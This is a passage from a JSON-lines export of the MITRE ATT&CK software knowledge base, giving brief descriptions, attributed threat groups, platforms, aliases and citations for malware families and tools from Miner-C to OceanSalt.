2019),(Citation: Unit 42 MuddyWater Nov 2017),(Citation: Nccgroup Emissary Panda May 2018),(Citation: Profero APT27 December 2020),(Citation: Crowdstrike Indrik November 2018),(Citation: Cycraft Chimera April 2020),(Citation: FireEye APT35 2018),(Citation: Microsoft 365 Defender Solorigate),(Citation: Cybereason Cobalt Kitty 2017),(Citation: RedCanary Mockingbird May 2020),(Citation: Mandiant APT41),(Citation: Costa AvosLocker May 2022),(Citation: CrowdStrike StellarParticle January 2022),(Citation: Microsoft 365 Defender Solorigate),(Citation: FoxIT Wocao December 2019),(Citation: Cisco Talos Avos Jun 2022),(Citation: Adsecurity Mimikatz Guide),(Citation: GitHub Mimikatz lsadump Module),(Citation: Deply Mimikatz),(Citation: Directory Services Internals DPAPI Backup Keys Oct 2015),(Citation: NCSC Joint Report Public Tools),(Citation: GitHub Mimikatz kerberos Module),(Citation: Harmj0y DCSync Sept 2015),(Citation: Metcalf 2015),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Delpy Mimikatz Crendential Manager),(Citation: AdSecurity Kerberos GT Aug 2015)"}
{"ID":"S0133","name":"Miner-C","description":"[Miner-C](https://attack.mitre.org/software/S0133) is malware that mines victims for the Monero cryptocurrency. It has targeted FTP servers and Network Attached Storage (NAS) devices to spread. (Citation: Softpedia MinerC)","url":"https://attack.mitre.org/software/S0133","created":"31 May 2017","last modified":"17 October 2018","version":"1.0","contributors":null,"platforms":null,"aliases":null,"type":"malware","relationship citations":",,(Citation: Softpedia MinerC)"}
{"ID":"S0051","name":"MiniDuke","description":"[MiniDuke](https://attack.mitre.org/software/S0051) is malware that was used by [APT29](https://attack.mitre.org/groups/G0016) from 2010 to 2015. The [MiniDuke](https://attack.mitre.org/software/S0051) toolset consists of multiple downloader and backdoor components. The loader has been used with other [MiniDuke](https://attack.mitre.org/software/S0051) components as well as in conjunction with [CosmicDuke](https://attack.mitre.org/software/S0050) and [PinchDuke](https://attack.mitre.org/software/S0048). (Citation: F-Secure The Dukes)","url":"https://attack.mitre.org/software/S0051","created":"31 May 2017","last modified":"14 October 2021","version":"1.3","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Secureworks IRON HEMLOCK Profile),(Citation: ESET Dukes October 2019),(Citation: F-Secure The Dukes),(Citation: ESET Dukes October 2019),(Citation: Securelist MiniDuke Feb 2013),(Citation: ESET Dukes October 2019),(Citation: F-Secure The Dukes)"}
{"ID":"S0280","name":"MirageFox","description":"[MirageFox](https://attack.mitre.org/software/S0280) is a remote access tool used against Windows systems. It appears to be an upgraded version of a tool known as Mirage, which is a RAT believed to originate in 2012. (Citation: APT15 Intezer June 2018)","url":"https://attack.mitre.org/software/S0280","created":"17 October 2018","last modified":"22 July 2022","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: APT15 Intezer June 2018),,(Citation: APT15 Intezer June 2018)"}
{"ID":"S0084","name":"Mis-Type","description":"[Mis-Type](https://attack.mitre.org/software/S0084) is a backdoor hybrid that was used in [Operation Dust Storm](https://attack.mitre.org/campaigns/C0016) by 2012.(Citation: Cylance Dust Storm)","url":"https://attack.mitre.org/software/S0084","created":"31 May 2017","last modified":"30 September 2022","version":"1.2","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",(Citation: Cylance Dust Storm),(Citation: Cylance Dust Storm),(Citation: Microsoft DTC)"}
{"ID":"S0083","name":"Misdat","description":"[Misdat](https://attack.mitre.org/software/S0083) is a backdoor that was used in [Operation Dust Storm](https://attack.mitre.org/campaigns/C0016) from 2010 to 2011.(Citation: Cylance Dust Storm)","url":"https://attack.mitre.org/software/S0083","created":"31 May 2017","last modified":"30 September 2022","version":"1.2","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",(Citation: Cylance Dust Storm),(Citation: Cylance Dust Storm),(Citation: Microsoft DTC)"}
{"ID":"S0080","name":"Mivast","description":"[Mivast](https://attack.mitre.org/software/S0080) is a backdoor that has been used by [Deep Panda](https://attack.mitre.org/groups/G0009). It was reportedly used in the Anthem breach. (Citation: Symantec Black Vine)","url":"https://attack.mitre.org/software/S0080","created":"31 May 2017","last modified":"20 July 2022","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Symantec Black Vine),,(Citation: Symantec Backdoor.Mivast)"}
{"ID":"S0079","name":"MobileOrder","description":"[MobileOrder](https://attack.mitre.org/software/S0079) is a Trojan intended to compromise Android mobile devices. It has been used by [Scarlet Mimic](https://attack.mitre.org/groups/G0029). (Citation: Scarlet Mimic Jan 2016)","url":"https://attack.mitre.org/software/S0079","created":"31 May 2017","last modified":"17 October 2018","version":"1.0","contributors":null,"platforms":null,"aliases":null,"type":"malware","relationship citations":"(Citation: Scarlet Mimic Jan 2016),,(Citation: Scarlet Mimic Jan 2016)"}
{"ID":"S0553","name":"MoleNet","description":"[MoleNet](https://attack.mitre.org/software/S0553) is a downloader tool with backdoor capabilities that has been observed in use since at least 2019.(Citation: Cybereason Molerats Dec 2020)","url":"https://attack.mitre.org/software/S0553","created":"28 December 2020","last modified":"27 April 2021","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Cybereason Molerats Dec 2020),,(Citation: Cybereason Molerats Dec 2020)"}
{"ID":"S1026","name":"Mongall","description":"[Mongall](https://attack.mitre.org/software/S1026) is a backdoor that has been used since at least 2013, including by [Aoqin Dragon](https://attack.mitre.org/groups/G1007).(Citation: SentinelOne Aoqin Dragon June 2022)","url":"https://attack.mitre.org/software/S1026","created":"25 July 2022","last modified":"24 October 2022","version":"1.0","contributors":"Hiroki Nagahama, NEC Corporation; Manikantan Srinivasan, NEC Corporation India; Pooja Natarajan, NEC Corporation India","platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: SentinelOne Aoqin Dragon June 2022),,(Citation: SentinelOne Aoqin Dragon June 2022)"}
{"ID":"S0149","name":"MoonWind","description":"[MoonWind](https://attack.mitre.org/software/S0149) is a remote access tool (RAT) that was used in 2016 to target organizations in Thailand. (Citation: Palo Alto MoonWind March 2017)","url":"https://attack.mitre.org/software/S0149","created":"31 May 2017","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: Palo Alto MoonWind March 2017)"}
{"ID":"S0284","name":"More_eggs","description":"[More_eggs](https://attack.mitre.org/software/S0284) is a JScript backdoor used by [Cobalt Group](https://attack.mitre.org/groups/G0080) and [FIN6](https://attack.mitre.org/groups/G0037). Its name was given based on the variable \"More_eggs\" being present in its code. There are at least two different versions of the backdoor being used, version 2.0 and version 4.4. (Citation: Talos Cobalt Group July 2018)(Citation: Security Intelligence More Eggs Aug 2019)","url":"https://attack.mitre.org/software/S0284","created":"17 October 2018","last modified":"23 April 2021","version":"3.0","contributors":"Drew Church, Splunk","platforms":"Windows","aliases":"SKID, SpicyOmelette, Terra Loader","type":"malware","relationship citations":"(Citation: ESET EvilNum July 2020),(Citation: Talos Cobalt Group July 2018),(Citation: Visa FIN6 Feb 2019),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: Security Intelligence More Eggs Aug 2019),,(Citation: Talos Cobalt Group July 2018),(Citation: Security Intelligence More Eggs Aug 2019),(Citation: ESET EvilNum July 2020)"}
{"ID":"S1047","name":"Mori","description":"[Mori](https://attack.mitre.org/software/S1047) is a backdoor that has been used by [MuddyWater](https://attack.mitre.org/groups/G0069) since at least January 2022.(Citation: DHS CISA AA22-055A MuddyWater February 2022)(Citation: CYBERCOM Iranian Intel Cyber January 2022)","url":"https://attack.mitre.org/software/S1047","created":"30 September 2022","last modified":"17 October 2022","version":"1.0","contributors":"Ozer Sarilar, @ozersarilar, STM","platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: DHS CISA AA22-055A MuddyWater February 2022),,(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: CYBERCOM Iranian Intel Cyber January 2022)"}
{"ID":"S0256","name":"Mosquito","description":"[Mosquito](https://attack.mitre.org/software/S0256) is a Win32 backdoor that has been used by [Turla](https://attack.mitre.org/groups/G0010). [Mosquito](https://attack.mitre.org/software/S0256) is made up of three parts: the installer, the launcher, and the backdoor. The main backdoor is called CommanderDLL and is launched by the loader program. (Citation: ESET Turla Mosquito Jan 2018)","url":"https://attack.mitre.org/software/S0256","created":"17 October 2018","last modified":"26 March 2023","version":"1.2","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Secureworks IRON HUNTER Profile),(Citation: ESET Turla Mosquito Jan 2018),(Citation: ESET Turla Mosquito May 2018),,(Citation: ESET Turla Mosquito Jan 2018)"}
{"ID":"S0699","name":"Mythic","description":"[Mythic](https://attack.mitre.org/software/S0699) is an open source, cross-platform post-exploitation/command and control platform. [Mythic](https://attack.mitre.org/software/S0699) is designed to \"plug-n-play\" with various agents and communication channels.(Citation: Mythic Github)(Citation: Mythic SpecterOps)(Citation: Mythc Documentation) Deployed [Mythic](https://attack.mitre.org/software/S0699) C2 servers have been observed as part of potentially malicious infrastructure.(Citation: RecordedFuture 2021 Ad Infra)","url":"https://attack.mitre.org/software/S0699","created":"26 March 2022","last modified":"18 April 2022","version":"1.0","contributors":"Cody Thomas, SpecterOps","platforms":"Linux, Windows, macOS","aliases":null,"type":"tool","relationship citations":",,(Citation: Mythc Documentation)"}
{"ID":"S0590","name":"NBTscan","description":"[NBTscan](https://attack.mitre.org/software/S0590) is an open source tool that has been used by state groups to conduct internal reconnaissance within a compromised network.(Citation: Debian nbtscan Nov 2019)(Citation: SecTools nbtscan June 2003)(Citation: Symantec Waterbug Jun 2019)(Citation: FireEye APT39 Jan 2019)","url":"https://attack.mitre.org/software/S0590","created":"17 March 2021","last modified":"24 April 2021","version":"1.0","contributors":"Daniyal Naeem, BT Security","platforms":"Linux, Windows, macOS","aliases":null,"type":"tool","relationship citations":"(Citation: TrendMicro EarthLusca 2022),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: Cybereason Soft Cell June 2019),(Citation: TrendMicro Tonto Team October 2020),(Citation: Symantec Waterbug Jun 2019),(Citation: Secureworks BRONZE PRESIDENT December 2019),(Citation: Trend Micro DRBControl February 2020),(Citation: Dell TG-3390),(Citation: FireEye APT39 Jan 2019),,(Citation: Debian nbtscan Nov 2019),(Citation: SecTools nbtscan June 2003)"}
{"ID":"S0272","name":"NDiskMonitor","description":"[NDiskMonitor](https://attack.mitre.org/software/S0272) is a custom backdoor written in .NET that appears to be unique to [Patchwork](https://attack.mitre.org/groups/G0040). (Citation: TrendMicro Patchwork Dec 2017)","url":"https://attack.mitre.org/software/S0272","created":"17 October 2018","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: TrendMicro Patchwork Dec 2017),,(Citation: TrendMicro Patchwork Dec 2017)"}
{"ID":"S0034","name":"NETEAGLE","description":"[NETEAGLE](https://attack.mitre.org/software/S0034) is a backdoor developed by [APT30](https://attack.mitre.org/groups/G0013) with compile dates as early as 2008. It has two main variants known as “Scout” and “Norton.” (Citation: FireEye APT30)","url":"https://attack.mitre.org/software/S0034","created":"31 May 2017","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: FireEye APT30),,(Citation: FireEye APT30)"}
{"ID":"S0198","name":"NETWIRE","description":"[NETWIRE](https://attack.mitre.org/software/S0198) is a publicly available, multiplatform remote administration tool (RAT) that has been used by criminal and APT groups since at least 2012.(Citation: FireEye APT33 Sept 2017)(Citation: McAfee Netwire Mar 2015)(Citation: FireEye APT33 Webinar Sept 2017)","url":"https://attack.mitre.org/software/S0198","created":"18 April 2018","last modified":"26 March 2023","version":"1.5","contributors":"Tony Lambert, Red Canary","platforms":"Linux, Windows, macOS","aliases":null,"type":"malware","relationship citations":"(Citation: FireEye APT33 Sept 2017),(Citation: Unit42 SilverTerrier 2018),(Citation: Cylance Shaheen Nov 2018),(Citation: FireEye APT33 Webinar Sept 2017),,(Citation: Red Canary NETWIRE January 2020),(Citation: Proofpoint NETWIRE December 2020),(Citation: FireEye APT33 Webinar Sept 2017),(Citation: FireEye NETWIRE March 2019),(Citation: McAfee Netwire Mar 2015),(Citation: Unit 42 NETWIRE April 2020)"}
{"ID":"S0353","name":"NOKKI","description":"[NOKKI](https://attack.mitre.org/software/S0353) is a modular remote access tool. The earliest observed attack using [NOKKI](https://attack.mitre.org/software/S0353) was in January 2018. [NOKKI](https://attack.mitre.org/software/S0353) has significant code overlap with the [KONNI](https://attack.mitre.org/software/S0356) malware family. There is some evidence potentially linking [NOKKI](https://attack.mitre.org/software/S0353) to [APT37](https://attack.mitre.org/groups/G0067).(Citation: Unit 42 NOKKI Sept 2018)(Citation: Unit 42 Nokki Oct 2018)","url":"https://attack.mitre.org/software/S0353","created":"30 January 2019","last modified":"18 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Crowdstrike GTR2020 Mar 2020),,(Citation: Unit 42 NOKKI Sept 2018)"}
{"ID":"S0205","name":"Naid","description":"[Naid](https://attack.mitre.org/software/S0205) is a trojan used by [Elderwood](https://attack.mitre.org/groups/G0066) to open a backdoor on compromised hosts. (Citation: Symantec Elderwood Sept 2012) (Citation: Symantec Naid June 2012)","url":"https://attack.mitre.org/software/S0205","created":"18 April 2018","last modified":"06 January 2021","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Symantec Elderwood Sept 2012),,(Citation: Symantec Naid June 2012)"}
{"ID":"S0228","name":"NanHaiShu","description":"[NanHaiShu](https://attack.mitre.org/software/S0228) is a remote access tool and JScript backdoor used by [Leviathan](https://attack.mitre.org/groups/G0065). [NanHaiShu](https://attack.mitre.org/software/S0228) has been used to target government and private-sector organizations that have relations to the South China Sea dispute. (Citation: Proofpoint Leviathan Oct 2017) (Citation: fsecure NanHaiShu July 2016)","url":"https://attack.mitre.org/software/S0228","created":"18 April 2018","last modified":"23 June 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Proofpoint Leviathan Oct 2017),(Citation: CISA AA21-200A APT40 July 2021),,(Citation: fsecure NanHaiShu July 2016),(Citation: Proofpoint Leviathan Oct 2017)"}
{"ID":"S0336","name":"NanoCore","description":"[NanoCore](https://attack.mitre.org/software/S0336) is a modular remote access tool developed in .NET that can be used to spy on victims and steal information. It has been used by threat actors since 2013.(Citation: DigiTrust NanoCore Jan 2017)(Citation: Cofense NanoCore Mar 2018)(Citation: PaloAlto NanoCore Feb 2016)(Citation: Unit 42 Gorgon Group Aug 2018)","url":"https://attack.mitre.org/software/S0336","created":"29 January 2019","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Unit42 SilverTerrier 2018),(Citation: Unit 42 Gorgon Group Aug 2018),(Citation: Citizen Lab Group5),(Citation: FireEye APT33 Webinar Sept 2017),,(Citation: Cofense NanoCore Mar 2018),(Citation: PaloAlto NanoCore Feb 2016),(Citation: DigiTrust NanoCore Jan 2017)"}
{"ID":"S0637","name":"NativeZone","description":"[NativeZone](https://attack.mitre.org/software/S0637) is the name given collectively to disposable custom [Cobalt Strike](https://attack.mitre.org/software/S0154) loaders used by [APT29](https://attack.mitre.org/groups/G0016) since at least 2021.(Citation: MSTIC Nobelium Toolset May 2021)(Citation: SentinelOne NobleBaron June 2021)","url":"https://attack.mitre.org/software/S0637","created":"04 August 2021","last modified":"16 October 2021","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: SentinelOne NobleBaron June 2021),,(Citation: MSTIC Nobelium Toolset May 2021),(Citation: SentinelOne NobleBaron June 2021)"}
{"ID":"S0247","name":"NavRAT","description":"[NavRAT](https://attack.mitre.org/software/S0247) is a remote access tool designed to upload, download, and execute files. It has been observed in attacks targeting South Korea. (Citation: Talos NavRAT May 2018)","url":"https://attack.mitre.org/software/S0247","created":"17 October 2018","last modified":"20 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Talos NavRAT May 2018),,(Citation: Talos NavRAT May 2018)"}
{"ID":"S0630","name":"Nebulae","description":"[Nebulae](https://attack.mitre.org/software/S0630) Is a backdoor that has been used by [Naikon](https://attack.mitre.org/groups/G0019)  since at least 2020.(Citation: Bitdefender Naikon April 2021)","url":"https://attack.mitre.org/software/S0630","created":"30 June 2021","last modified":"15 October 2021","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Bitdefender Naikon April 2021),,(Citation: Bitdefender Naikon April 2021)"}
{"ID":"S0691","name":"Neoichor","description":"[Neoichor](https://attack.mitre.org/software/S0691) is C2 malware used by [Ke3chang](https://attack.mitre.org/groups/G0004) since at least 2019; similar malware families used by the group include Leeson and Numbldea.(Citation: Microsoft NICKEL December 2021)","url":"https://attack.mitre.org/software/S0691","created":"22 March 2022","last modified":"11 April 2022","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Microsoft NICKEL December 2021),,(Citation: Microsoft NICKEL December 2021)"}
{"ID":"S0210","name":"Nerex","description":"[Nerex](https://attack.mitre.org/software/S0210) is a Trojan used by [Elderwood](https://attack.mitre.org/groups/G0066) to open a backdoor on compromised hosts. (Citation: Symantec Elderwood Sept 2012) (Citation: Symantec Nerex May 2012)","url":"https://attack.mitre.org/software/S0210","created":"18 April 2018","last modified":"06 January 2021","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Symantec Elderwood Sept 2012),,(Citation: Symantec Nerex May 2012),(Citation: Symantec Ristol May 2012)"}
{"ID":"S0039","name":"Net","description":"The [Net](https://attack.mitre.org/software/S0039) utility is a component of the Windows operating system. It is used in command-line operations for control of users, groups, services, and network connections. (Citation: Microsoft Net Utility)\n\n[Net](https://attack.mitre.org/software/S0039) has a great deal of functionality, (Citation: Savill 1999) much of which is useful for an adversary, such as gathering system and network information for Discovery, moving laterally through [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) using <code>net use</code> commands, and interacting with services. The net1.exe utility is executed for certain functionality when net.exe is run and can be used directly in commands such as <code>net1 user</code>.","url":"https://attack.mitre.org/software/S0039","created":"31 May 2017","last modified":"03 March 2023","version":"2.4","contributors":"David Ferguson, CyberSponse","platforms":"Windows","aliases":"net.exe","type":"tool","relationship citations":"(Citation: Dragos Crashoverride 2018),(Citation: Red Canary Hospital Thwarted Ryuk October 2020),(Citation: SecureWorks BRONZE UNION June 2017),(Citation: NCC Group Chimera January 2021),(Citation: Mandiant APT1),(Citation: NCC Group APT15 Alive and Strong),(Citation: Symantec Orangeworm April 2018),(Citation: CrowdStrike Ryuk January 2019),(Citation: DFIR Ryuk 2 Hour Speed Run November 2020),(Citation: DFIR Ryuk in 5 Hours October 2020),(Citation: FireEye KEGTAP SINGLEMALT October 2020),(Citation: Alperovitch 2014),(Citation: US-CERT TA18-074A),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: CISA SoreFang July 2016),(Citation: FireEye APT41 Aug 2019),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Mandiant Operation Ke3chang November 2014),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: Baumgartner Naikon 2015),(Citation: Bitdefender Naikon April 2021),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: FireEye admin@338),(Citation: Symantec Elfin Mar 2019),(Citation: FireEye APT40 March 2019),(Citation: Palo Alto OilRig May 2016),(Citation: Trend Micro TA505 June 2019),(Citation: Dell TG-1314),(Citation: Sophos New Ryuk Attack October 2020),(Citation: FireEye APT34 Dec 2017),(Citation: DFIR Ryuk's Return October 2020),(Citation: Kaspersky Turla),(Citation: DFIR Phosphorus November 2021),(Citation: FireEye APT38 Oct 2018),(Citation: Cybereason Soft Cell June 2019),(Citation: Cybereason Cobalt Kitty 2017),(Citation: DFIR Report APT35 ProxyShell March 2022),,(Citation: Microsoft Net),(Citation: Savill 1999),(Citation: TechNet Net Time),(Citation: Technet Net Use)"}
{"ID":"S0056","name":"Net Crawler","description":"[Net Crawler](https://attack.mitre.org/software/S0056) is an intranet worm capable of extracting credentials using credential dumpers and spreading to systems on a network over SMB by brute forcing accounts with recovered passwords and using [PsExec](https://attack.mitre.org/software/S0029) to execute a copy of [Net Crawler](https://attack.mitre.org/software/S0056). (Citation: Cylance Cleaver)","url":"https://attack.mitre.org/software/S0056","created":"31 May 2017","last modified":"22 July 2022","version":"1.1","contributors":null,"platforms":"Windows","aliases":"NetC","type":"malware","relationship citations":"(Citation: Cylance Cleaver),,(Citation: Cylance Cleaver)"}
{"ID":"S0033","name":"NetTraveler","description":"[NetTraveler](https://attack.mitre.org/software/S0033) is malware that has been used in multiple cyber espionage campaigns for basic surveillance of victims. The earliest known samples have timestamps back to 2005, and the largest number of observed samples were created between 2010 and 2013. (Citation: Kaspersky NetTraveler)","url":"https://attack.mitre.org/software/S0033","created":"31 May 2017","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Proofpoint TA459 April 2017),,(Citation: Kaspersky NetTraveler)"}
{"ID":"S0457","name":"Netwalker","description":"[Netwalker](https://attack.mitre.org/software/S0457) is fileless ransomware written in PowerShell and executed directly in memory.(Citation: TrendMicro Netwalker May 2020)","url":"https://attack.mitre.org/software/S0457","created":"26 May 2020","last modified":"22 March 2023","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: TrendMicro Netwalker May 2020),(Citation: Sophos Netwalker May 2020)"}
{"ID":"S0508","name":"Ngrok","description":"[Ngrok](https://attack.mitre.org/software/S0508) is a legitimate reverse proxy tool that can create a secure tunnel to servers located behind firewalls or on local machines that do not have a public IP. [Ngrok](https://attack.mitre.org/software/S0508) has been leveraged by threat actors in several campaigns including use for lateral movement and data exfiltration.(Citation: Zdnet Ngrok September 2018)(Citation: FireEye Maze May 2020)(Citation: Cyware Ngrok May 2019)(Citation: MalwareBytes LazyScripter Feb 2021)","url":"https://attack.mitre.org/software/S0508","created":"15 September 2020","last modified":"13 April 2023","version":"1.1","contributors":"Janantha Marasinghe","platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: CrowdStrike PIONEER KITTEN August 2020),,(Citation: Trend Micro Ngrok September 2020),(Citation: Cyware Ngrok May 2019),(Citation: Zdnet Ngrok September 2018),(Citation: FireEye Maze May 2020),(Citation: MalwareBytes Ngrok February 2020)"}
{"ID":"S0118","name":"Nidiran","description":"[Nidiran](https://attack.mitre.org/software/S0118) is a custom backdoor developed and used by [Suckfly](https://attack.mitre.org/groups/G0039). It has been delivered via strategic web compromise. (Citation: Symantec Suckfly March 2016)","url":"https://attack.mitre.org/software/S0118","created":"31 May 2017","last modified":"15 April 2022","version":"1.1","contributors":null,"platforms":"Windows","aliases":"Backdoor.Nidiran","type":"malware","relationship citations":"(Citation: Symantec Suckfly May 2016),(Citation: Symantec Suckfly March 2016),,(Citation: Symantec Backdoor.Nidiran),(Citation: Microsoft SAM)"}
{"ID":"S0359","name":"Nltest","description":"[Nltest](https://attack.mitre.org/software/S0359) is a Windows command-line utility used to list domain controllers and enumerate domain trusts.(Citation: Nltest Manual)","url":"https://attack.mitre.org/software/S0359","created":"14 February 2019","last modified":"07 October 2021","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"tool","relationship citations":"(Citation: DFIR Ryuk in 5 Hours October 2020),(Citation: Red Canary Hospital Thwarted Ryuk October 2020),(Citation: TrendMicro EarthLusca 2022),(Citation: FireEye KEGTAP SINGLEMALT October 2020),(Citation: Sophos New Ryuk Attack October 2020),(Citation: DFIR Ryuk 2 Hour Speed Run November 2020),(Citation: Bitdefender FIN8 July 2021),(Citation: DFIR Ryuk's Return October 2020),,(Citation: Fortinet TrickBot),(Citation: Nltest Manual)"}
{"ID":"S0368","name":"NotPetya","description":"[NotPetya](https://attack.mitre.org/software/S0368) is malware that was used by [Sandworm Team](https://attack.mitre.org/groups/G0034) in a worldwide attack starting on June 27, 2017. While [NotPetya](https://attack.mitre.org/software/S0368) appears as a form of ransomware, its main purpose was to destroy data and disk structures on compromised systems; the attackers never intended to make the encrypted data recoverable. As such, [NotPetya](https://attack.mitre.org/software/S0368) may be more appropriately thought of as a form of wiper malware. [NotPetya](https://attack.mitre.org/software/S0368) contains worm-like features to spread itself across a computer network using the SMBv1 exploits EternalBlue and EternalRomance.(Citation: Talos Nyetya June 2017)(Citation: US-CERT NotPetya 2017)(Citation: ESET Telebots June 2017)(Citation: US District Court Indictment GRU Unit 74455 October 2020)","url":"https://attack.mitre.org/software/S0368","created":"26 March 2019","last modified":"08 March 2023","version":"2.0","contributors":null,"platforms":"Windows","aliases":"Diskcoder.C, ExPetr, GoldenEye, Nyetya, Petrwrap","type":"malware","relationship citations":"(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: Secureworks IRON VIKING ),(Citation: NCSC Sandworm Feb 2020),(Citation: UK NCSC Olympic Attacks October 2020),(Citation: Trend Micro Cyclops Blink March 2022),,(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: US-CERT NotPetya 2017),(Citation: NCSC Joint Report Public Tools),(Citation: PsExec Russinovich),(Citation: Talos Nyetya June 2017)"}
{"ID":"S0138","name":"OLDBAIT","description":"[OLDBAIT](https://attack.mitre.org/software/S0138) is a credential harvester used by [APT28](https://attack.mitre.org/groups/G0007). (Citation: FireEye APT28) (Citation: FireEye APT28 January 2017)","url":"https://attack.mitre.org/software/S0138","created":"31 May 2017","last modified":"26 March 2023","version":"1.1","contributors":null,"platforms":"Windows","aliases":"Sasfis","type":"malware","relationship citations":"(Citation: FireEye APT28),,(Citation: FireEye APT28)"}
{"ID":"S0165","name":"OSInfo","description":"[OSInfo](https://attack.mitre.org/software/S0165) is a custom tool used by [APT3](https://attack.mitre.org/groups/G0022) to do internal discovery on a victim's computer and network. (Citation: Symantec Buckeye)","url":"https://attack.mitre.org/software/S0165","created":"16 January 2018","last modified":"18 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Symantec Buckeye),,(Citation: Symantec Buckeye)"}
{"ID":"S0402","name":"OSX/Shlayer","description":"[OSX/Shlayer](https://attack.mitre.org/software/S0402) is a Trojan designed to install adware on macOS that was first discovered in 2018.(Citation: Carbon Black Shlayer Feb 2019)(Citation: Intego Shlayer Feb 2018)","url":"https://attack.mitre.org/software/S0402","created":"29 August 2019","last modified":"19 October 2022","version":"1.3","contributors":null,"platforms":"macOS","aliases":"Crossrider, Zshlayer","type":"malware","relationship citations":",,(Citation: Malwarebytes Crossrider Apr 2018),(Citation: sentinelone shlayer to zshlayer),(Citation: Intego Shlayer Feb 2018),(Citation: sentinellabs resource named fork 2020),(Citation: 20 macOS Common Tools and Techniques),(Citation: Carbon Black Shlayer Feb 2019),(Citation: tau bundlore erika noerenberg 2020),(Citation: Shlayer jamf gatekeeper bypass 2021),(Citation: objectivesee osx.shlayer apple approved 2020),(Citation: Intego Shlayer Apr 2018)"}
{"ID":"S0352","name":"OSX_OCEANLOTUS.D","description":"[OSX_OCEANLOTUS.D](https://attack.mitre.org/software/S0352) is a MacOS backdoor with several variants that has been used by [APT32](https://attack.mitre.org/groups/G0050).(Citation: TrendMicro MacOS April 2018)(Citation: Trend Micro MacOS Backdoor November 2020)","url":"https://attack.mitre.org/software/S0352","created":"30 January 2019","last modified":"14 January 2022","version":"2.2","contributors":null,"platforms":"macOS","aliases":"Backdoor.MacOS.OCEANLOTUS.F","type":"malware","relationship citations":"(Citation: Amnesty Intl. Ocean Lotus February 2021),(Citation: TrendMicro MacOS April 2018),,(Citation: 20 macOS Common Tools and Techniques),(Citation: Trend Micro MacOS Backdoor November 2020),(Citation: sentinelone apt32 macOS backdoor 2020),(Citation: TrendMicro MacOS April 2018),(Citation: ESET OceanLotus macOS April 2019)"}
{"ID":"S0644","name":"ObliqueRAT","description":"[ObliqueRAT](https://attack.mitre.org/software/S0644) is a remote access trojan, similar to [Crimson](https://attack.mitre.org/software/S0115), that has been in use by [Transparent Tribe](https://attack.mitre.org/groups/G0134) since at least 2020.(Citation: Talos Oblique RAT March 2021)(Citation: Talos Transparent Tribe May 2021)","url":"https://attack.mitre.org/software/S0644","created":"08 September 2021","last modified":"15 October 2021","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022),(Citation: Talos Oblique RAT March 2021),,(Citation: Talos Transparent Tribe May 2021),(Citation: Talos Oblique RAT March 2021)"}
{"ID":"S0346","name":"OceanSalt","description":"[OceanSalt](https://attack.mitre.org/software/S0346) is a Trojan that was used in a campaign targeting victims in South Korea, United States, and Canada. [OceanSalt](https://attack.mitre.org/software/S0346) shares code similarity with [SpyNote RAT](https://attack.mitre.org/software/S0305), which has been linked to [APT1](https://attack.mitre.org/groups/G0006).(Citation: McAfee Oceansalt Oct 2018)","url":"https://attack.mitre.org/software/S0346","created":"30 January 2019","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: McAfee Oceansalt Oct 2018)"}
